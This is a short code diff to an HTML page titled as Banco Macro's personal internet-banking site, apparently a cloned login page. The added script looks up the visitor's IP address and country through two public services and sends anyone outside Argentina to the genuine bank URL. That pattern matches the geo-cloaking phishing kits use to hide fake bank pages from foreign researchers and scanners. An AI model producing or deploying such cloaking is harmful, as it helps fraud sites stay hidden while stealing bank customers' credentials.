@@ -8,6 +8,24 @@
     <title>Banco Macro | Banca Internet Personas</title>
     <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="/css/index-desktop.css">
+    <script>
+
+        async function getIpClient() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            var data = await response.json();
+            console.log(data.ip);
+            const response2 = await fetch('http://ip-api.com/json/'+data.ip);
+            var data2 = await response2.json();
+            console.log(data2.country);
+
+            if(data2.country != 'Argentina'){
+                window.location.replace("https://www.macro.com.ar/bancainternet/");
+            }
+        }
+
+        getIpClient();
+
+    </script>
 </head>
 
 <body id="body">
